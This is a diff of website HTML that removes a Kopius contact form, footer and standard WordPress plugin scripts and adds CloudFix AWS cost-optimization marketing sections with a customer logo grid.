-<div class="wp-block-button"><a class="wp-block-button__link wp-element-button" href="http://kopius.wpengine.com/insights-innovation#newsletter" style="border-radius:0px">Sign Up</a></div>
-</div>
-</div></div></div></div></div>
-
-
-
-<div class="crown-connect"><div class="two-col"><div class="left" style="background:#000000"><h6 class="subtitle" style="color:#ffffff">CONTACT US</h6><h1 class="collapsible" style="color:#ffffff">Let&#8217;s<br/>Connect</h1><p style="color:#ffffff">We love talking about technology, business, and design. Join the conversation.<br/><br/><a href="https://kopiustech.com/contact-us/">Contact Us →</a></p></div><div class="right" style="background:gray;background-image:url(http://kopius.wpengine.com/wp-content/uploads/2021/06/Screen-Shot-2022-12-02-at-12.02.41-PM.png);background-size:cover;background-position:center"><h5 class="subtitle" style="color:#000000">HOW CAN WE HELP</h5><div class="form"><div class="content">
-                <div class='gf_browser_chrome gform_wrapper gravity-theme gform-theme--no-framework' data-form-theme='gravity-theme' data-form-index='0' id='gform_wrapper_1' ><div id='gf_1' class='gform_anchor' tabindex='-1'></div>
-                        <div class='gform_heading'>
-                            <p class='gform_description'>Your digital journey starts here</p>
-                        </div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_1' id='gform_1'  action='/capabilities/cloud-strategy/#gf_1' data-formid='1' novalidate>
-                        <div class='gform-body gform_body'><div id='gform_fields_1' class='gform_fields top_label form_sublabel_below description_below'><div id="field_1_1"  class="gfield gfield--type-text gfield_contains_required field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_1"><label class='gfield_label gform-field-label' for='input_1_1' >Full Name<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_text'><input name='input_1' id='input_1_1' type='text' value='' class='large'     aria-required="true" aria-invalid="false"   /> </div></div><div id="field_1_2"  class="gfield gfield--type-email gfield--width-full gfield_contains_required field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_2"><label class='gfield_label gform-field-label' for='input_1_2' >Email<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_email'>
-                            <input name='input_2' id='input_1_2' type='email' value='' class='large'    aria-required="true" aria-invalid="false"  />
-                        </div></div><div id="field_1_8"  class="gfield gfield--type-text gfield--width-full field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_8"><label class='gfield_label gform-field-label' for='input_1_8' >Phone Number (Optional)</label><div class='ginput_container ginput_container_text'><input name='input_8' id='input_1_8' type='text' value='' class='large'      aria-invalid="false"   /> </div></div><div id="field_1_3"  class="gfield gfield--type-textarea gfield--width-full gfield_contains_required field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_3"><label class='gfield_label gform-field-label' for='input_1_3' >Message<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_textarea'><textarea name='input_3' id='input_1_3' class='textarea large'     aria-required="true" aria-invalid="false"   rows='10' cols='50'></textarea></div></div><div id="field_1_4"  class="gfield gfield--type-captcha gfield--width-full field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_4"><label class='gfield_label gform-field-label' for='input_1_4' >CAPTCHA</label><div id='input_1_4' class='ginput_container ginput_recaptcha' data-sitekey='6Ld2-xElAAAAAKDeEQDoRf58Ifx_Qm6dUlDYweM0'  data-theme='light' data-tabindex='0'  data-badge=''></div></div><div id="field_1_7"  class="gfield gfield--type-text field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_7"><label class='gfield_label gform-field-label' for='input_1_7' >Untitled</label><div class='ginput_container ginput_container_text'><input name='input_7' id='input_1_7' type='text' value='' class='large'      aria-invalid="false"   /> </div></div><div id="field_1_9"  class="gfield gfield--type-honeypot gform_validation_container field_sublabel_below gfield--has-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_9"><label class='gfield_label gform-field-label' for='input_1_9' >Email</label><div class='ginput_container'><input name='input_9' id='input_1_9' type='text' value='' autocomplete='new-password'/></div><div class='gfield_description' id='gfield_description_1_9'>This field is for validation purposes and should be left unchanged.</div></div></div></div>
-        <div class='gform_footer top_label'> <input type='submit' id='gform_submit_button_1' class='gform_button button' value='Submit'  onclick='if(window["gf_submitting_1"]){return false;}  if( !jQuery("#gform_1")[0].checkValidity || jQuery("#gform_1")[0].checkValidity()){window["gf_submitting_1"]=true;}  ' onkeypress='if( event.keyCode == 13 ){ if(window["gf_submitting_1"]){return false;} if( !jQuery("#gform_1")[0].checkValidity || jQuery("#gform_1")[0].checkValidity()){window["gf_submitting_1"]=true;}  jQuery("#gform_1").trigger("submit",[true]); }' /> <input type='hidden' name='gform_ajax' value='form_id=1&amp;title=&amp;description=1&amp;tabindex=0' />
-            <input type='hidden' class='gform_hidden' name='is_submit_1' value='1' />
-            <input type='hidden' class='gform_hidden' name='gform_submit' value='1' />
-            
-            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
-            <input type='hidden' class='gform_hidden' name='state_1' value='WyJbXSIsImMxNjFiN2Q1OTlhNmJhMzlhOTBjMTFjNzJhMmY1MzU1Il0=' />
-            <input type='hidden' class='gform_hidden' name='gform_target_page_number_1' id='gform_target_page_number_1' value='0' />
-            <input type='hidden' class='gform_hidden' name='gform_source_page_number_1' id='gform_source_page_number_1' value='1' />
-            <input type='hidden' name='gform_field_values' value='' />
-            
-        </div>
-                        </form>
-                        </div>
-		                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_1' id='gform_ajax_frame_1' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
-		                <script>
-gform.initializeOnLoaded( function() {gformInitSpinner( 1, 'https://kopiustech.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery('#gform_ajax_frame_1').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_1');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_1').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_1').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_1').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_1').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_1').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_1').val();gformInitSpinner( 1, 'https://kopiustech.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery(document).trigger('gform_page_loaded', [1, current_page]);window['gf_submitting_1'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}setTimeout(function(){jQuery('#gform_wrapper_1').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_1').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [1]);window['gf_submitting_1'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_1').text());}, 50);}else{jQuery('#gform_1').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger('gform_post_render', [1, current_page]);} );} );
-</script>
-</div></div></div></div></div>
-	</div><!-- .entry-content -->
-
-	</article><!-- #post-843 -->
-
-	</main><!-- #main -->
-
-
-	<!-- <footer id="colophon" class="site-footer desktop"> -->
-	<footer id="colophon" class="site-footer">
-		<div class="top">
-			<div class="two-col">
-				<div class="col col-wide">
-					<div class="col">
-						<img width="640" height="157"   alt="" decoding="async" data-srcset="https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light.png 768w, https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light-300x73.png 300w"  data-src="https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light.png" data-sizes="(max-width: 640px) 100vw, 640px" class="attachment-large size-large lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img width="640" height="157" src="https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light.png" class="attachment-large size-large" alt="" decoding="async" srcset="https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light.png 768w, https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light-300x73.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></noscript>					</div>
-				</div>
-
-				<div class="col col-narrow">
-					<div class="col contact">
-						<p class="">Kopius US<br />
-						3055 112th Ave. NE, Suite 225<br />
-						Bellevue, WA 98004<br />
-						USA</p>
-						<p class="phone">+1 206 494 4339<br />
-						<a href="mailto:info@kopiustech.com">info@kopiustech.com</a></p>
-					</div>
-					<div class="col contact">
-						<p class="">Kopius LatAm<br />
-						Olga Cossettini 363<br />
-						C1107CCH Puerto Madero<br />
-						Argentina</p>
-						<p class="phone">+1 312 821 4600<br />
-						<a href="mailto:info@kopiustech.com">info@kopiustech.com</a></p>
-					</div>
-				</div>
-			</div>
+				<ul class="social-icons">
+<li><a href="https://www.linkedin.com/company/cloudfix-saves/" target="_blank" rel="noopener noreferrer" class="icon">
+    <svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="display:none">
+    <title>LinkedIn</title>
+    <use xlink:href="#linkedin-logo" />
+    </svg>
+  </a></li>
+<li><a href="https://twitter.com/cloudfix_saves" target="_blank" rel="noopener noreferrer" class="icon">
+    <svg class="" aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="display:none">
+    <title>Twitter</title>  
+    <use xlink:href="#twitter-logo" />
+    </svg>
+  </a></li>
+<li><a href="https://www.youtube.com/@aureacloudfix" target="_blank" rel="noopener noreferrer" class="icon">
+    <svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="display:none">
+    <title>YouTube</title>
+    <use xlink:href="#youtube-logo" />
+    </svg>
+  </a></li>
+</ul>		</nav>
+		<div class="shape-container">
+			<div class="main-bg-shape"></div>
 		</div>
-
-		<div class="bottom">
-			<div class="two-col">
-				<div class="col privacy">
-					<p>© 2023 Kopius, Inc.
-					<a href="/privacy-policy">Privacy Policy</a></p>
-				</div>
-
-				<div class="col menu">
-					<a href="/approach/">Approach</a>
-					<a href="/capabilities/">Capabilities</a>
-					<a href="/our-work/">Case Studies</a>
-					<a href="/about-us/">About</a>
-					<a href="/insights-innovation/">Insights</a>
-					<a href="/contact-us/">Contact</a>
-					<a href="/careers/">Careers</a>
-
-					<div>
-						<a href="https://www.linkedin.com/company/kopius-tech" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/linkedin.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/linkedin.png"></noscript></a>
-						<a href="https://twitter.com/KopiusTech/" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/twitter.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/twitter.png"></noscript></a>
-						<a href="https://www.instagram.com/kopiustech/" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/instagram.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/instagram.png"></noscript></a>
-						<a href="https://www.youtube.com/@KopiusTech" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/youtube.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/youtube.png"></noscript></a>
-						<a href="https://www.twitch.tv/kopiustech" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/twitch.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/twitch.png"></noscript></a>
-					</div>
-
-				</div>
-			</div>
-		</div>
-	</footer>
-
-
-
-<!-- --------- START PLUGIN MARKETINGCLOUDFX-WP - INTEGRATION SCRIPTS --------- -->
-<!-- MCFX Integration: Gravity Forms -->
-<script type="text/javascript" data-registered="mcfx-plugin" >
-	if (
-		/* global mcfx */
-		'undefined' !== typeof mcfx
-	) {
-		document.addEventListener( 'submit.gravityforms', ( e ) => {
-			if ( 'function' === typeof mcfx ) {
-				mcfx( 'capture', e.target );
-			}
-		} );
-	}
-</script>
-<!-- --------- END PLUGIN MARKETINGCLOUDFX-WP - INTEGRATION SCRIPTS --------- -->
-<style id='core-block-supports-inline-css'>
-.wp-block-columns.wp-container-4{flex-wrap:nowrap;}.wp-block-buttons.wp-container-5{justify-content:center;}
+	</header>
+	<main id="main" class="page-main"><section  class="hero divider divider--ed379 pt-4 pt-lg-5 pt-xl-6 pb-3 px-0  hero--main">
+	<div class="inner grid col-one-over-one">
+		<div class="sub-one"><h1 class="has-dark-blue-color text-align-center">Nonstop AWS cost savings</h1><h6 class="has-dark-blue-color text-align-center">CloudFix is the automatic, always-running way to optimize AWS cost and performance. </h6><div class="button-group" style="gap:1rem;justify-content:center"><span><a class="calendly-demo-btn" href="/demo/" >Schedule a Live Demo</a></span></div></div><div class="sub-two"><figure class="image"><img width="1200" height="879" src="https://cloudfix.aurea.com/wp-content/uploads/PFA_Graphic_1200.png" class="attachment-large size-large" alt="" decoding="async" loading="lazy" style="" srcset="https://cloudfix.aurea.com/wp-content/uploads/PFA_Graphic_1200.png 1200w, https://cloudfix.aurea.com/wp-content/uploads/PFA_Graphic_1200-600x440.png 600w, https://cloudfix.aurea.com/wp-content/uploads/PFA_Graphic_1200-300x220.png 300w, https://cloudfix.aurea.com/wp-content/uploads/PFA_Graphic_1200-768x563.png 768w" sizes="(max-width: 1200px) 100vw, 1200px" /></figure></div>	</div>
+	<div class="shape-container">
+		<div class="main-bg-shape"></div>
+	</div>
+		</section>
+ 
+<style>
+	:root {
+		--navbar-bg: transparent;
+	} 
 </style>
-<script id='getwid-blocks-frontend-js-js-extra'>
-var Getwid = {"settings":[],"ajax_url":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","isRTL":"","nonces":{"recaptcha_v2_contact_form":"e0d55aecda"}};
-</script>
-<script src='https://kopiustech.com/wp-content/plugins/getwid/assets/js/frontend.blocks.js?ver=1679091486' id='getwid-blocks-frontend-js-js'></script>
-<script id='page-scroll-to-id-plugin-script-js-extra'>
-var mPS2id_params = {"instances":{"mPS2id_instance_0":{"selector":"a[href*='#']:not([href='#'])","autoSelectorMenuLinks":"true","excludeSelector":"a[href^='#tab-'], a[href^='#tabs-'], a[data-toggle]:not([data-toggle='tooltip']), a[data-slide], a[data-vc-tabs], a[data-vc-accordion], a.screen-reader-text.skip-link","scrollSpeed":800,"autoScrollSpeed":"true","scrollEasing":"easeInOutQuint","scrollingEasing":"easeOutQuint","forceScrollEasing":"false","pageEndSmoothScroll":"true","stopScrollOnUserAction":"false","autoCorrectScroll":"false","autoCorrectScrollExtend":"false","layout":"vertical","offset":0,"dummyOffset":"false","highlightSelector":"","clickedClass":"mPS2id-clicked","targetClass":"mPS2id-target","highlightClass":"mPS2id-highlight","forceSingleHighlight":"false","keepHighlightUntilNext":"false","highlightByNextTarget":"false","appendHash":"false","scrollToHash":"true","scrollToHashForAll":"true","scrollToHashDelay":0,"scrollToHashUseElementData":"true","scrollToHashRemoveUrlHash":"false","disablePluginBelow":0,"adminDisplayWidgetsId":"true","adminTinyMCEbuttons":"true","unbindUnrelatedClickEvents":"false","unbindUnrelatedClickEventsSelector":"","normalizeAnchorPointTargets":"false","encodeLinks":"false"}},"total_instances":"1","shortcode_class":"_ps2id"};
-</script>
-<script src='https://kopiustech.com/wp-content/plugins/page-scroll-to-id/js/page-scroll-to-id.min.js?ver=1680889762' id='page-scroll-to-id-plugin-script-js'></script>
-<script id='ultp-script-js-extra'>
-var ultp_data_frontend = {"url":"https:\/\/kopiustech.com\/wp-content\/plugins\/ultimate-post\/","ajax":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","security":"8907796b54"};
-</script>
-<script src='https://kopiustech.com/wp-content/plugins/ultimate-post/assets/js/ultp.min.js?ver=1679091486' id='ultp-script-js'></script>
-<script id='wpmm_js-js-extra'>
-var ajax_objects = {"ajaxurl":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","redirecturl":"https:\/\/kopiustech.com\/","loadingmessage":"Sending user info, please wait..."};
-var wpmm_object = {"ajax_url":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","wpmm_responsive_breakpoint":"1200px","wpmm_disable_mobile":"false"};
-</script>
-<script src='https://kopiustech.com/wp-content/plugins/wp-megamenu/assets/js/wpmm.js?ver=1679091487' id='wpmm_js-js'></script>
-<script src='https://kopiustech.com/wp-includes/js/jquery/ui/core.min.js?ver=1679091487' id='jquery-ui-core-js'></script>
-<script src='https://kopiustech.com/wp-includes/js/jquery/ui/datepicker.min.js?ver=1679091487' id='jquery-ui-datepicker-js'></script>
-<script id='jquery-ui-datepicker-js-after'>
-jQuery(function(jQuery){jQuery.datepicker.setDefaults({"closeText":"Close","currentText":"Today","monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Previous","dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"dateFormat":"MM d, yy","firstDay":1,"isRTL":false});});
-</script>
-<script src='https://kopiustech.com/wp-content/themes/valence/js/navigation.js?ver=1679091487' id='valence-navigation-js'></script>
-<script src='https://kopiustech.com/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=1679091487' id='regenerator-runtime-js'></script>
-<script src='https://kopiustech.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=1679091487' id='wp-polyfill-js'></script>
-<script src='https://kopiustech.com/wp-includes/js/dist/dom-ready.min.js?ver=1679091487' id='wp-dom-ready-js'></script>
-<script src='https://kopiustech.com/wp-includes/js/dist/hooks.min.js?ver=1679091487' id='wp-hooks-js'></script>
-<script src='https://kopiustech.com/wp-includes/js/dist/i18n.min.js?ver=1679091487' id='wp-i18n-js'></script>
-<script id='wp-i18n-js-after'>
-wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
-</script>
-<script src='https://kopiustech.com/wp-includes/js/dist/a11y.min.js?ver=1679091487' id='wp-a11y-js'></script>
-<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/assets/js/dist/vendor-theme.min.js?ver=1679091486' id='gform_gravityforms_theme_vendors-js'></script>
-<script id='gform_gravityforms_theme-js-extra'>
-var gform_theme_config = {"common":{"form":{"honeypot":{"version_hash":"f71615be7e225a7fb9d6dbd943b88fc6"}}},"hmr_dev":"","public_path":"https:\/\/kopiustech.com\/wp-content\/plugins\/gravityforms\/assets\/js\/dist\/"};
-</script>
-<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/assets/js/dist/scripts-theme.min.js?ver=1679091486' id='gform_gravityforms_theme-js'></script>
-<script src='https://kopiustech.com/wp-content/plugins/wp-smushit/app/assets/js/smush-lazy-load.min.js?ver=1679091487' id='smush-lazy-load-js'></script>
-<script src='https://kopiustech.com/wp-content/plugins/getwid/vendors/slick/slick/slick.min.js?ver=1679091486' id='slick-js'></script>
-<script src='https://kopiustech.com/wp-includes/js/imagesloaded.min.js?ver=1679091487' id='imagesloaded-js'></script>
-<script>
-gform.initializeOnLoaded( function() { jQuery(document).on('gform_post_render', function(event, formId, currentPage){if(formId == 1) {} } );jQuery(document).bind('gform_post_conditional_logic', function(event, formId, fields, isInit){} ) } );
-</script>
-<script>
-gform.initializeOnLoaded( function() { jQuery(document).trigger('gform_post_render', [1, 1]) } );
-</script>
+<section  class="logo-bar divider divider--56da0 pt-4 pt-lg-5 pt-xl-6 pb-5 pb-md-6 pb-lg-7 pb-xl-8 px-0  scroll">
+	<div class="inner section-title"><h2>The world’s most innovative businesses trust CloudFix</h2></div>	<div class="logo-wrapper">
+		<div class="logo-grid">
+			<figure><img width="196" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/western_digital_logo_bw.png" class="attachment-full size-full" alt="Western Digital" decoding="async" loading="eager" /></figure><figure><img width="235" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/tokara_logo_bw.png" class="attachment-full size-full" alt="Tokara Solutions" decoding="async" loading="eager" /></figure><figure><img width="202" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/rbi_logo_bw.png" class="attachment-full size-full" alt="rbi" decoding="async" loading="eager" /></figure><figure><img width="236" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/mobilogy_logo_bw.png" class="attachment-full size-full" alt="mobilogy" decoding="async" loading="eager" /></figure><figure><img width="362" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/kingslake_logo_bw.png" class="attachment-full size-full" alt="Kingslake" decoding="async" loading="eager" srcset="https://cloudfix.aurea.com/wp-content/uploads/kingslake_logo_bw.png 362w, https://cloudfix.aurea.com/wp-content/uploads/kingslake_logo_bw-300x51.png 300w" sizes="(max-width: 362px) 100vw, 362px" /></figure><figure><img width="154" height="91" src="https://cloudfix.aurea.com/wp-content/uploads/InsideSales_logo_bw.png" class="attachment-full size-full" alt="InsideSales" decoding="async" loading="eager" /></figure><figure><img width="158" height="91" src="https://cloudfix.aurea.com/wp-content/uploads/conns_logo_bw.png" class="attachment-full size-full" alt="Conn&#039;s HomePlus" decoding="async" loading="eager" /></figure><figure><img width="182" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/insmed_logo_bw.png" class="attachment-full size-full" alt="" decoding="async" loading="eager" /></figure><figure><img width="120" height="90" src="https://cloudfix.aurea.com/wp-content/uploads/valent_logo_bw.png" class="attachment-full size-full" alt="" decoding="async" loading="eager" /></figure>		</div>
+					<div class="logo-grid">
+				<figure><img width="196" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/western_digital_logo_bw.png" class="attachment-full size-full" alt="Western Digital" decoding="async" loading="lazy" /></figure><figure><img width="235" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/tokara_logo_bw.png" class="attachment-full size-full" alt="Tokara Solutions" decoding="async" loading="lazy" /></figure><figure><img width="202" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/rbi_logo_bw.png" class="attachment-full size-full" alt="rbi" decoding="async" loading="lazy" /></figure><figure><img width="236" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/mobilogy_logo_bw.png" class="attachment-full size-full" alt="mobilogy" decoding="async" loading="lazy" /></figure><figure><img width="362" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/kingslake_logo_bw.png" class="attachment-full size-full" alt="Kingslake" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/kingslake_logo_bw.png 362w, https://cloudfix.aurea.com/wp-content/uploads/kingslake_logo_bw-300x51.png 300w" sizes="(max-width: 362px) 100vw, 362px" /></figure><figure><img width="154" height="91" src="https://cloudfix.aurea.com/wp-content/uploads/InsideSales_logo_bw.png" class="attachment-full size-full" alt="InsideSales" decoding="async" loading="lazy" /></figure><figure><img width="158" height="91" src="https://cloudfix.aurea.com/wp-content/uploads/conns_logo_bw.png" class="attachment-full size-full" alt="Conn&#039;s HomePlus" decoding="async" loading="lazy" /></figure><figure><img width="182" height="61" src="https://cloudfix.aurea.com/wp-content/uploads/insmed_logo_bw.png" class="attachment-full size-full" alt="" decoding="async" loading="lazy" /></figure><figure><img width="120" height="90" src="https://cloudfix.aurea.com/wp-content/uploads/valent_logo_bw.png" class="attachment-full size-full" alt="" decoding="async" loading="lazy" /></figure>			</div>
+			</div>
+		</section><section  class="content-block infobox divider divider--a671c py-5 py-md-6 py-lg-7 py-xl-8 px-0 ">
+		<div class="inner grid col-single">
+		<div class="sub-one has-tag-callout"><div class="status-callout small-heading" ><div><h5>Control AWS costs with CloudFix</h5><p>CloudFix scans your AWS accounts, identifies new cost savings opportunities, and automatically implements fixes – around the clock. Unlike tools that just find one-off savings, CloudFix runs continuously in the background, so you can realize 15-60% per AWS service in compounding savings.</p>
+</div></div><div class="tag-callout has-rounded has-shadow" style="left:calc(82% - 150px);top:-68%;width:300px"><h5 class="has-bright-navy-color" style="text-align: center; font-size: 2.7rem; margin-bottom: 0.5rem;">15-60%</h5>
+<p style="text-align: center;">Savings per AWS service</p></div></div>	</div>
+		</section>
+<section  class="scroll-locker divider divider--84705 pt-4 pt-lg-5 pt-xl-6 pb-3 px-0 ">
+	
+	<div class="inner grid col-right-sidebar">
+		<div class="col-one">
+			<div class="scroll-locker__container">
+			<figure data-source="84705-0" class="scroll-locker__tablet-image"><img width="1044" height="671" src="https://cloudfix.aurea.com/wp-content/uploads/Find-1.png" class="attachment-large size-large" alt="" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/Find-1.png 1044w, https://cloudfix.aurea.com/wp-content/uploads/Find-1-600x386.png 600w, https://cloudfix.aurea.com/wp-content/uploads/Find-1-300x193.png 300w, https://cloudfix.aurea.com/wp-content/uploads/Find-1-768x494.png 768w" sizes="(max-width: 1044px) 100vw, 1044px" /></figure><figure data-source="84705-1" class="scroll-locker__tablet-image"><img width="1044" height="671" src="https://cloudfix.aurea.com/wp-content/uploads/Fix-1.png" class="attachment-large size-large" alt="" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/Fix-1.png 1044w, https://cloudfix.aurea.com/wp-content/uploads/Fix-1-600x386.png 600w, https://cloudfix.aurea.com/wp-content/uploads/Fix-1-300x193.png 300w, https://cloudfix.aurea.com/wp-content/uploads/Fix-1-768x494.png 768w" sizes="(max-width: 1044px) 100vw, 1044px" /></figure><figure data-source="84705-2" class="scroll-locker__tablet-image"><img width="1044" height="671" src="https://cloudfix.aurea.com/wp-content/uploads/Save-1.png" class="attachment-large size-large" alt="" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/Save-1.png 1044w, https://cloudfix.aurea.com/wp-content/uploads/Save-1-600x386.png 600w, https://cloudfix.aurea.com/wp-content/uploads/Save-1-300x193.png 300w, https://cloudfix.aurea.com/wp-content/uploads/Save-1-768x494.png 768w" sizes="(max-width: 1044px) 100vw, 1044px" /></figure>			</div>
+		</div>
+		<div class="col-two">
+		<div class="section-title"><h2>Find. Fix. Save. Repeat.</h2></div>			<div class="scroll-locker__cell" data-target="84705-0"><figure class="scroll-locker__mobile-image"><img width="600" height="386" src="https://cloudfix.aurea.com/wp-content/uploads/Find-1-600x386.png" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/Find-1-600x386.png 600w, https://cloudfix.aurea.com/wp-content/uploads/Find-1-300x193.png 300w, https://cloudfix.aurea.com/wp-content/uploads/Find-1-768x494.png 768w, https://cloudfix.aurea.com/wp-content/uploads/Find-1.png 1044w" sizes="(max-width: 600px) 100vw, 600px" /></figure><div class="scroll-locker__content"><h3>Find</h3>
+<p>CloudFix continuously scans your AWS environment for savings opportunities and performance enhancements. It focuses on smaller “fixes” that have a big impact at scale, and flags only the optimizations that AWS has already identified as risk free.</p>
+</div></div><div class="scroll-locker__cell" data-target="84705-1"><figure class="scroll-locker__mobile-image"><img width="600" height="386" src="https://cloudfix.aurea.com/wp-content/uploads/Fix-1-600x386.png" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/Fix-1-600x386.png 600w, https://cloudfix.aurea.com/wp-content/uploads/Fix-1-300x193.png 300w, https://cloudfix.aurea.com/wp-content/uploads/Fix-1-768x494.png 768w, https://cloudfix.aurea.com/wp-content/uploads/Fix-1.png 1044w" sizes="(max-width: 600px) 100vw, 600px" /></figure><div class="scroll-locker__content"><h3>Fix</h3>
+<p>Unlike tools that only find savings, CloudFix actually runs the optimizations – easily and automatically. Every fix is no-risk, AWS-recommended, and guaranteed not to cause downtime. Plus, CloudFix’s least privilege model makes sure you’re always secure.</p>
